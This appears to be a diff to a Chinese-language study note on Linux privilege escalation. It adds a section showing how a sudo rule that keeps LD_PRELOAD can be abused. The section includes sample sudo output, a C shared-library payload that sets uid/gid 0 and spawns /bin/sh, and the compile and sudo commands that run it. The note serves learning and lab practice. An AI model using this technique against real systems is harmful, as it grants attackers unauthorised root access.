@@ -22,6 +22,7 @@ tags: Cybersecurity
 5. [Cron Jobs](#5-cron-jobs)
 6. [PATH](#6-path)
 7. [NFS](#7-nfs)
+8. [env_keep+=LD_PRELOAD](#8)
 
 ### 1. Kernel Exploit
 有些Linux版本內核會有漏洞可以利用來提權，這部分可以在最剛開始拿到權限時就進行測試，因為不需要跑什麼腳本，可以通過簡單的查詢來快速排除/利用此項提權手法:
@@ -180,6 +181,39 @@ chmod +s nfs
 ```bash
 ./nfs
 ```
+
+
+### 8. env_keep+=LD_PRELOAD
+sudo -l 後若是結果為:
+
+```bash
+saad@ip-10-10-177-196:/tmp$ sudo -l
+[sudo] password for saad: 
+Matching Defaults entries for saad on ip-10-10-177-196:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
+
+User saad may run the following commands on ip-10-10-177-196:
+    (root) /usr/bin/ping
+```
+
+其中root權限的程序在GTFOBins查過後不能直接提權，再加上有 `env_keep+=LD_PRELOAD` 的話，可以依照以下步驟提權:
+1. 新建shell.c
+
+```C
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/sh");
+}
+```
+
+2. 轉為library: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
+3. 執行 `sudo LD_PRELOAD=/tmp/shell.so ping`，其中ping為有root權限的程序
+
 
 ### 自我總結
 提權手法類別:
